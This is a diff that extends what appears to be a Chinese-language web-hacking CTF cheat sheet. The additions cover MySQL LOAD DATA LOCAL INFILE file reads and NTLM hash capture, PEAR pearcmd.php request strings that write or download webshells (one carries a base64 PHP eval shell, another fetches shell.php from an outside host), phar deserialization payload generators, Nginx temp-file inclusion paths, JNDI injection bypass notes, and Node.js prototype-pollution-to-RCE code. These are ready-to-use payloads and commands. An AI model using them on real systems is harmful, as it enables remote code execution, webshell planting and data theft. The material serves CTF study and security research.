@@ -1027,6 +1027,33 @@ pop graphic-context
     - `09 0A 0B 0C 0D A0 20`
 - File-read function
     - `LOAD_FILE('/etc/passwd')`
+    - `LOAD DATA INFILE`
+        - Client 讀 Server 文件
+        - 一樣受 `secure_file_priv`, `FILE` privilege 限制 (ref: [link](https://dev.mysql.com/doc/refman/8.0/en/load-data.html))
+    - `LOAD DATA LOCAL INFILE`
+        - Server 讀 Client 文件
+        - `LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE test FIELDS TERMINATED BY "\n";`
+        - 不需要 `FILE` privilege，且任意目錄檔案皆可讀 (只要Client有權限即可)
+        - support UNC Path
+            - `LOAD DATA LOCAL INFILE '\\\\172.16.136.153\\test' into table mysql.test FIELDS TERMINATED BY "\n";`
+                - stealing net-NTLM hash
+        - Trigger phar deserialization
+            - `LOAD DATA LOCAL INFILE 'phar://test.phar/test' INTO TABLE a LINES TERMINATED BY '\n'`
+            - 非default設置
+              ```
+              [mysqld]
+              local-infile=1
+              secure_file_priv=""
+              ```
+
+        - Tool
+            - [Rogue-MySQL-Server](https://github.com/allyshka/Rogue-MySql-Server)
+            - [MysqlClientAttack](https://github.com/lcark/MysqlClientAttack)
+        - Example
+            - [N1CTF 2019 - sql_manage](https://xz.aliyun.com/t/6300)
+            - [HITCON 2019 - GoGoPowerSQL](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/README.md#gogo-powersql)
+            - [0CTF 2018 Final - h4x0rs.club](https://l4wio.github.io/CTF-challenges-by-me/0ctf_final-2018/0ctf_tctf_2018_slides.pdf)
+            - [VolgaCTF 2018 - Corp Monitoring](https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html)
 - File-write
     - `INTO DUMPFILE`
         - 適用binary (寫入同一行)
@@ -1039,7 +1066,7 @@ pop graphic-context
         - `SELECT file_priv FROM mysql.user`
     - secure-file-priv
         - 限制MySQL導入導出
-            - load_file, into outfile等
+            - load_file, into outfile, load data等
         - 運行時無法更改
         - MySQL 5.5.53前，該變數預設為空(可以導入導出)
         - e.g. `secure_file_priv=E:\`
@@ -1992,6 +2019,10 @@ HQL injection example (pwn2win 2017)
 - `php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=index.php`
 - `php://filter/convert.iconv.UCS-4LE.UCS-4BE/resource=index.php`
 - ...
+- 進階玩法
+    - LFI RCE without controlling any file: https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
+    - Example:
+        - [hxp ctf 2021 - includer's revenge](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)
 
 ## php://input
 
@@ -2030,6 +2061,42 @@ HQL injection example (pwn2win 2017)
     - Example
         - [HITCON CTF 2018 - One Line PHP Challenge](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
         - [0CTF 2021 Qual - 1linephp](https://github.com/w181496/CTF/tree/master/0ctf2021_qual/1linephp)
+
+## PEAR
+
+- 條件
+    - 安裝pear (pearcmd.php)
+    - 有開 `register_argc_argv`
+- 寫檔
+    - 法一: `/?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php`
+    - 法二: `/?+-c+/tmp/shell.php+-d+man_dir=<?phpinfo();?>/*+-s+list&file=/usr/local/lib/php/pearcmd.php`
+    - 法三: `/?+download+https://kaibro.tw/shell.php+&fike=/usr/local/lib/php/pearcmd.php`
+    - 法四: `/?+channel-discover+kaibro.tw/302.php?&file=/usr/local/lib/php/pearcmd.php`
+        - 302.php 會跳轉到 test.php 做下載
+- 安裝package
+    - `/?+install+--force+--installroot+/tmp/wtf+http://kaibro.tw/KaibroShell.tgz+?&file=/usr/local/lib/php/pearcmd.php`
+- Command Injection
+    - `/?+install+-R+&file=/usr/local/lib/php/pearcmd.php&+-R+/tmp/other+channel://pear.php.net/Archive_Tar-1.4.14`
+    - `/?+bundle+-d+/tmp/;echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==%7Cbase64${IFS}-d>/tmp/hello-0daysober.php;/+/tmp/other/tmp/pear/download/Archive_Tar-1.4.14.tgz+&file=/usr/local/lib/php/pearcmd.php&`
+    - `/?+svntag+/tmp/;echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==%7Cbase64${IFS}-d>/tmp/hello-0daysober.php;/Archive_Tar+&file=/usr/local/lib/php/pearcmd.php&`
+- Example
+    - [Balsn CTF 2021 - 2linephp](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021#2linephp)
+    - [巅峰极客2020 - MeowWorld](https://www.anquanke.com/post/id/218977#h2-3)
+
+## Nginx buffering
+
+- 當 Request body 過大或是 fastcgi server response 過大，超過 buffer size 時，其內容會保存到暫存檔中 ([reference](https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size))
+    - 會在 `/var/lib/nginx/body/`, `/var/lib/nginx/fastcgi/` 下建立暫存檔
+    - 但該暫存檔會馬上被刪除
+    - 可以透過 `/proc/<nginx worker pid>/fd/<fd>` 來取得被刪除的檔案內容
+        - php 的 `include()` 會將 fd 路徑解析成 `/var/lib/nginx/body/0000001337 (deleted)` 格式，導致引入失敗
+        - 可以用以下方式繞過
+            - `/proc/self/fd/34/../../../34/fd/15`
+            - `/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/34/fd/15`
+
+- Example
+    - [hxp ctf 2021 - includer's revenge](https://hxp.io/blog/90/hxp%20CTF%202021:%20includer%27s%20revenge%20writeup/)
+    - [hxp ctf 2021 - counter](https://hxp.io/blog/89/hxp-CTF-2021-counter-writeup/)
 
 ## data://
 
@@ -2291,9 +2358,62 @@ HQL injection example (pwn2win 2017)
     - phar文件會將使用者自定義的metadata以序列化形式保存
     - 透過`phar://`偽協議可以達到反序列化的效果
     - 常見影響函數: `file_get_contents()`, `file_exists()`, `is_dir()`, ...
+    - 透過phar觸發反序列化時，檔名需要有副檔名(任意副檔名都行)
+    - Payload generator
+      ```
+      <?php
+        class TestObject {
+        }
+
+        @unlink("phar.phar");
+        $phar = new Phar("phar.phar");
+        $phar->startBuffering();
+        $phar->setStub("<?php __HALT_COMPILER(); ?>");
+        $o = new TestObject();
+        $phar->setMetadata($o);
+        $phar->addFromString("test.txt", "test");
+        $phar->stopBuffering();
+      ?>
+      ```
+    - php識別phar是透過`__HALT_COMPILER();?>`
+        - 可以在開頭stub塞東西
+        - e.g. 偽造GIF頭: `$phar->setStub('GIF89a'.'<?php __HALT_COMPILER();?>');`
+    - trigger phar deserialization by zip
+      ```
+      <?php
+        class FLAG{}
+
+        $obj=serialize(new FLAG());
+        $zip = new ZipArchive;
+        $res = $zip->open('test.zip', ZipArchive::CREATE);
+        $zip->addFromString('test.txt', 'meow');
+        $zip->setArchiveComment($obj);
+        $zip->close();
+
+        // trigger:  phar://test.zip
+      ```
+
+    - trigger phar deserialization by tar
+      ```
+      <?php
+      //@unlink("trigger.tar");
+      class FLAG{}
+      $phar = new PharData("trigger.tar");
+      $phar["kaibro"] = "meow";
+      $obj = new FLAG();
+      $phar->setMetadata($obj);
+      // trigger: phar://trigger.tar
+      ```
+
     - Generic Gadget Chains
         - [phpggc](https://github.com/ambionics/phpggc)
+    - bypass phar:// 不能出現在開頭
+        - `compress.zlib://`, `compress.bzip2://`, ...
+        - `compress.zlib://phar://meow.phar/test.txt`
+        - `php://filter/read=convert.base64-encode/resource=phar://meow.phar`
     - Example
+        - [N1CTF 2021 - easyphp](https://harold.kim/blog/2021/11/n1ctf-writeup/)
+        - [N1CTF 2019 - sql_manage](https://github.com/Nu1LCTF/n1ctf-2019/blob/master/WEB/sql_manage/README.md)
         - [HITCON CTF 2017 - Baby^H Master](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017)
         - [HITCON CTF 2018 - Baby Cake PHP 2017](https://blog.kaibro.tw/2018/10/24/HITCON-CTF-2018-Web/)
         - [DCTF 2018 - Vulture](https://cyku.tw/ctf-defcamp-qualification-2018/)
@@ -2421,10 +2541,17 @@ print marshalled
 - Codebase
     - JDK 6u45, 7u21 開始，`useCodebaseOnly` 預設為 true
         - 禁止自動載入遠端 class 文件
-    - JDK 6u132, 7u122, 8u113 下，`com.sun.jndi.rmi.object.trustURLCodebase`, `com.sun.jndi.cosnaming.object.trustURLCodebase` 預設為 false
-        - RMI 預設不允許從遠端 Codebase 載入 Reference class
-    - JDK 11.0.1, 8u191, 7u201, 6u211 後，`com.sun.jndi.ldap.object.trustURLCodebase` 預設為 false
-        - LDAP 預設不允許從遠端 Codebase 載入 Reference class
+    - JNDI Injection
+        - JDK 6u132, 7u122, 8u113 下，`com.sun.jndi.rmi.object.trustURLCodebase`, `com.sun.jndi.cosnaming.object.trustURLCodebase` 預設為 false
+            - RMI 預設不允許從遠端 Codebase 載入 Reference class
+        - JDK 11.0.1, 8u191, 7u201, 6u211 後，`com.sun.jndi.ldap.object.trustURLCodebase` 預設為 false
+            - LDAP 預設不允許從遠端 Codebase 載入 Reference class
+        - 高版本JDK (8u191+)
+            - codebase 無法利用 (trustURLCodebase=false)
+            - 可能攻擊路徑
+                - 1. 找可利用的 ObjectFactory
+                    - e.g. Tomcat 下可利用 `org.apache.naming.factory.BeanFactory` + `javax.el.ELProcessor`
+                - 2. 透過 `javaSerializedData` 進行反序列化
 - Tool
     - [yososerial](https://github.com/frohoff/ysoserial)
         - URLDNS: 不依賴任何額外library，可以用來做 dnslog 驗證
@@ -2440,8 +2567,10 @@ print marshalled
         - 找 gadget chain
     - [GadgetProbe](https://github.com/BishopFox/GadgetProbe)
         - 透過字典檔配合DNS callback，判斷環境使用哪些library, class等資訊
+    - [JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass)
 - [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
 - Example
+    - [Balsn CTF 2021 - 4pple Music](https://github.com/w181496/My-CTF-Challenges/tree/master/Balsn-CTF-2021#4pple-music)
     - [0CTF 2021 Qual - 2rm1](https://github.com/ceclin/0ctf-2021-2rm1-soln)
     - [0CTF 2019 Final - hotel booking system](https://balsn.tw/ctf_writeup/20190608-0ctf_tctf2019finals/#tctf-hotel-booking-system)
     - [TrendMicro CTF 2018 Qual - Forensics 300](https://github.com/balsn/ctf_writeup/tree/master/20180914-trendmicroctf#300-3)
@@ -2706,7 +2835,11 @@ header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%
             - Command Phase
         - `gopher://127.0.0.1:3306/_<PAYLOAD>`
         - Tool: https://github.com/undefinedd/extract0r-
-
+    - MSSQL
+        - Example
+            - [35c3 - post](https://ctftime.org/writeup/12808)
+            - [N1CTF 2021 - Funny_web](https://harold.kim/blog/2021/11/n1ctf-writeup/)
+        - Tool: https://github.com/hack2fun/gopher_attack_mssql
     - Tomcat
         - 透過 tomcat manager 部署 war
         - 要先有帳密，可以從 `tomcat-users.xml` 讀，或是踹預設密碼
@@ -3041,6 +3174,59 @@ console.log(o3.b)
     var a = {};
     _.merge({}, JSON.parse(malicious_payload));
     ```
+
+## Process Spawning
+
+- 如果可以污染環境變數+Process spawning，將有機會RCE
+
+```javascript
+const { exec, execSync, spawn, spawnSync, fork } = require('child_process');
+
+// pollute
+Object.prototype.env = {
+	NODE_DEBUG : 'require("child_process").execSync("touch pwned")//',
+	NODE_OPTIONS : '-r /proc/self/environ'
+};
+
+// method 1
+fork('blank');
+// method 2
+spawn('node', ['blank']).stdout.pipe(process.stdout);
+// method 3
+console.log(spawnSync('node', ['blank']).stdout.toString());
+// method 4
+console.log(execSync('node  blank').toString());
+```
+
+```javascript
+({}).__proto__.NODE_OPTIONS = '--require=./malicious-code.js';
+console.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());
+```
+
+```javascript
+({}).__proto__.NODE_OPTIONS = `--experimental-loader="data:text/javascript,console.log('injection');"`;
+console.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());
+```
+
+
+- 如果可以蓋 `Object.prototype.shell`，則 spawn 任意指令都可 RCE
+
+```javascript
+const child_process = require('child_process');
+
+Object.prototype.shell = 'node';
+Object.prototype.env = {
+   NODE_DEBUG : '1; throw require("child_process").execSync("touch pwned").toString()//',
+   NODE_OPTIONS : '-r /proc/self/environ'
+};
+
+child_process.execSync('id');
+```
+
+- 補充：蓋環境變數的各種玩法 (https://blog.p6.is/Abusing-Environment-Variables/)
+
+- Example
+    - [ACSC 2021 Qual - Cowsay as a Service](https://github.com/w181496/CTF/tree/master/ACSC2021_qual/cowsay)
 
 ## Misc
 
@@ -3738,6 +3924,23 @@ state[i] = state[i-3] + state[i-31]`
     - `"ſ".toUpperCase() == 'S'`
     - `"K".toLowerCase() == 'k'`
     - [Reference](https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html)
+- Javascript replace特性
+    - replace string 中可以使用 `$`
+    ```
+    > "123456".replace("34", "xx")
+    '12xx56'
+    > "123456".replace("34", "$`")
+    '121256'
+    > "123456".replace("34", "$&")
+    '123456'
+    > "123456".replace("34", "$'")
+    '125656'
+    > "123456".replace("34", "$$")
+    '12$56'
+    ```
+    - Example
+        - [Dragon CTF 2021 - webpwn](https://github.com/w181496/CTF/tree/master/dragonctf-2021)
+
 
 - Node.js目錄穿越漏洞
     - CVE-2017-14849
@@ -3790,6 +3993,11 @@ state[i] = state[i-3] + state[i-31]`
 - Symlink
     - `ln -s ../../../../../../etc/passwd kaibro.link`
     - `zip --symlink bad.zip kaibro.link`
+
+- curl trick
+    - `curl 'fi[k-m]e:///etc/passwd`
+    - `curl '{asd,bb}'`
+    - Example: [N1CTF 2021 - Funny_web](https://vuln.live/blog/16)
 
 - tcpdump
     - `-i` 指定網卡，不指定則監控所有網卡
